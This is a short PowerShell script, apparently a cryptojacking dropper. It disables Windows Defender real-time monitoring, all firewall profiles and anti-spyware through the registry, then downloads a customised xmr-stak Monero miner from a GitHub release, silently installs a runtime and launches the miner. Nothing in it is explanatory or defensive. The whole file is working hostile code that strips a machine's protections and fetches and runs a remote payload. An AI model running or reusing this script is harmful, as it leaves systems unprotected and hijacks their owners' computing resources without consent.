Set-MpPreference -DisableRealtimeMonitoring $true
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://github.com/ShazotiHashimoto/xmr-stak/releases/download/1.0.4-custom/xmr-stak.zip","C:\xmr-stak.zip")
Expand-Archive -LiteralPath "C:\xmr-stak.zip" -DestinationPath "C:\xmr-stak" -Force
cd C:\xmr-stak\xmr-stak\
.\vc.exe /S /v /qn
.\xmr-stak-rx.exe
